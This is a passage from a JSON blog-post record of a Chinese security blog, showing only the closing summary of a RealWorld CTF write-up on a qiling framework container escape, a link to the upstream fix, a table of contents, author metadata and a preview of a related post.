title=\"总结\"></a>总结</h2><p>​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe\">https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe</a></p></blockquote>\n","text":"RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":1,"path":"api/categories/CTF.json"},{"name":"容器安全","slug":"CTF/容器安全","count":1,"path":"api/categories/CTF/容器安全.json"}],"tags":[{"name":"CTF","slug":"CTF","count":1,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RealWorld-CTF%E4%B9%8Bqiling%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90\"><span class=\"toc-text\">RealWorld CTF之qiling框架分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#qiling\"><span class=\"toc-text\">qiling</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">漏洞利用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"容器进程切换漏洞","uid":"2f1f68ab5dfcea1c92e15793016ea760","slug":"容器进程切换漏洞","date":"2022-02-13T10:48:45.000Z","updated":"2023-04-11T13:09:57.496Z","comments":true,"path":"api/articles/容器进程切换漏洞.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/docker.3x87dx4ktik0.png","text":"容器进程切换思考前置技术Magic Link​ /proc/目录下存在很多的链接文件，但是在Linu...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"容器安全","slug":"容器安全","count":1,"path":"api/categories/容器安全.json"}],"tags":[{"name":"容器安全","slug":"容器安全","count":1,"path":"api/tags/容器安全.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}